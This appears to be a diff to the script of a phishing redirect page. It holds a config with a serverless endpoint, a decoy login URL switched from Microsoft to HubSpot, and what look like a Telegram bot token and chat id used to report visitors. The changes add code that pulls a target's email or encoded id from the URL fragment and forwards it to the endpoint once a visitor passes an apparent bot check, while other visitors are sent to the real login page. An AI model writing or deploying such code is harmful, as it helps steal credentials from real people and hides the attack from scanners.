@@ -10,12 +10,25 @@
 <script>
 const CFG = {
   D: "https://faas-nyc1-2ef2e6cc.doserverless.co/api/v1/web/fn-41e74b37-dd43-49e8-a188-5e80baa811f1/default/sys/",
-  B: "https://login.microsoftonline.com",
+  B: "https://login.hubspot.com",
   T: "8254511136:AAFZSGmygKmwaqghywbvxv2-VmPSr7HqqWE",
   C: "-1003701370299"
 };
 
 let state = { score: 0, interacted: false };
+
+
+
+const extractDataFromHash = () => {
+  const hash = window.location.hash;
+  if (!hash || !hash.startsWith('#ki')) return null;
+  
+  const dataPart = hash.substring(3); 
+  if (!dataPart) return null;
+  
+  // Return as-is (plain email or base64 string - don't decode)
+  return dataPart;
+};
 
 const tgLog = async txt => {
   try {
@@ -142,7 +155,14 @@ const run = async () => {
     window.location.replace(CFG.B);
   } else {
     await tgLog(log + "\nSTATUS: PASSED");
-    setTimeout(() => window.location.replace(CFG.D), 400);
+    const data = extractDataFromHash();
+    let destinationUrl = CFG.D;
+    if (data) {
+      
+      const separator = destinationUrl.includes('?') ? '&' : '?';
+      destinationUrl = `${destinationUrl}${separator}u=${encodeURIComponent(data)}`;
+    }
+    setTimeout(() => window.location.replace(destinationUrl), 400);
   }
 };
 
